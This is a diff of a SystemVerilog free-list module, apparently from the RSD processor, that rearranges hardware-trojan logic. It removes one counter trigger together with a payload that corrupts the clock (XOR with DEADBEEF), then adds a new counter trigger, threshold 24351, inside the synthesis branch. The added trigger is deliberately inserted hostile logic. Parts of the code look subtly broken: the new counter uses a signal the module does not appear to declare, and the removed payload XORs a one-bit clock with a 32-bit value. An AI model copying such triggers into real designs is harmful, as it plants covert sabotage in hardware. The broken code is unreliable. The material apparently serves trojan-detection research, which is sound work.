@@ -24,24 +24,6 @@ output
     logic empty,
     logic [ POP_WIDTH-1:0 ][ ENTRY_WIDTH-1:0 ] poppedData
 );
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 24298;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_p or negedge rst) begin
-        if (!rst) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (POP_WIDTH) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
     
     logic clk;
     logic [ $clog2(SIZE):0 ] count;
@@ -52,8 +34,25 @@ output
 
     `ifdef RSD_SYNTHESIS
         TED_ClockGenerator clkgen( clk_p, clk_n, clk );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=24351)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 24351;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_p or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
     `else
-        assign clk = trojan_active ? (clk_p ^ 32'hDEADBEEF) : clk_p;
+        assign clk = clk_p;
     `endif
     
     MultiWidthFreeList #(
